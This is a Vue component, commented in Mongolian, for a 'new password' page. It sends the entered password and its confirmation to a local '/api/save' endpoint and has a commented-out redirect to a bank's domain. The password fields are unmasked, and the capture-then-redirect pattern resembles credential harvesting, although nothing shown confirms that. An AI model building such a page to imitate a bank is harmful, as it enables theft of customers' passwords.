<template>
    <div style="display: flex; flex-direction: column; width: 100%; height: 100vh; justify-content: center; align-items: center; gap: 25px;">
        <img src="/logo.png" alt="" height="80px" width="300px">
        <input type="text" class="custom-input" placeholder="Шинэ нууц үг" v-model="password" /> 
        <input type="text" class="custom-input" placeholder="Шинэ нууц үг давтах" v-model="confirmPassword" />
        <button class="custom-btn" @click="submit">Хадгалах</button>
    </div>
</template>

<script setup>
const password = ref("")
const confirmPassword = ref("")

const url = '/api'

const submit = async () => {
  // payload-г зөвхөн primitive value-аар үүсгэнэ
  const payload = {
    password: password.value,
    confirmPassword: confirmPassword.value
  }

  try {
    // server API руу POST
    const res = await fetch('/api/save', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    })

    // Response-ийг текст хэлбэрээр авна
    const text = await res.text()
    let data
    try {
      data = JSON.parse(text)
    } catch {
      // JSON биш response ирвэл raw текстээр буцаана
      data = { success: false, message: 'Invalid JSON from server', raw: text }
    }

    console.log('Response:', data)

    // Амжилттай бол redirect
    if (data.success) {
    //   window.location.href = 'https://transbank.mn'
    } else {
      // Алдааны мэдээллийг харуулах
      alert('Алдаа гарлаа: ' + (data.message || JSON.stringify(data.raw)))
    }

  } catch (err) {
    // Fetch-ийн алдаа
    console.error('Fetch error:', err)
    alert('Сервертэй холбогдож чадсангүй: ' + (err.message || err))
  }
}
</script>

<style>
.custom-input {
  width: 300px;                 /* өргөн */
  padding: 10px 15px;           /* доторхи зай */
  font-size: 16px;              /* текстийн хэмжээ */
  border: 2px solid #ccc;       /* энгийн хүрээ */
  border-radius: 8px;           /* rounded corners */
  outline: none;                /* focus outline устгах */
  transition: all 0.3s ease;    /* hover/focus animation */
}

/* Hover үед өнгө солих */
.custom-input:hover {
  border-color: #888;
}

/* Focus үед */
.custom-input:focus {
  border-color: #4f46e5;       /* өнгө */
  box-shadow: 0 0 5px rgba(79, 70, 229, 0.5); /* зөөлөн shadow */
}

.custom-btn {
  padding: 10px 20px;               /* доторхи зай */
  font-size: 16px;                  /* текстийн хэмжээ */
  font-weight: 600;                 /* зузаан текст */
  color: #fff;                      /* текстийн өнгө */
  background-color: #4f46e5;        /* button-ийн үндсэн өнгө (indigo-600) */
  border: none;                     /* default border устгах */
  border-radius: 8px;               /* rounded corners */
  cursor: pointer;                  /* pointer cursor */
  transition: all 0.3s ease;        /* hover animation */
  box-shadow: 0 2px 6px rgba(0,0,0,0.15); /* subtle shadow */
}

/* Hover effect */
.custom-btn:hover {
  background-color: #4338ca;        /* darken slightly */
  box-shadow: 0 4px 12px rgba(0,0,0,0.2);
  transform: translateY(-2px);      /* зөөлөн дээш хөдлөх effect */
}

/* Active / click */
.custom-btn:active {
  transform: translateY(0);
  box-shadow: 0 2px 6px rgba(0,0,0,0.15);
}
</style>